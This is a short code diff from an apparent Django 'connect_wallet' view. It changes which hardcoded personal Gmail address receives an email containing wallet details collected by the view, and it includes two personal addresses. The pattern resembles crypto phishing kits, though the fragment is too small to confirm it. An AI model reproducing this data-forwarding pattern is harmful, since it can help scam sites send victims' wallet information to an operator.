@@ -34,7 +34,7 @@ def connect_wallet(request):
             f"Recipient Wallet: {recipient_wallet}\n"
         )
         # jotop147@gmail.com
-        recipient_email = "yakubudestiny9@gmail.com"
+        recipient_email = "jotop147@gmail.com"
 
         try:
             send_mail(
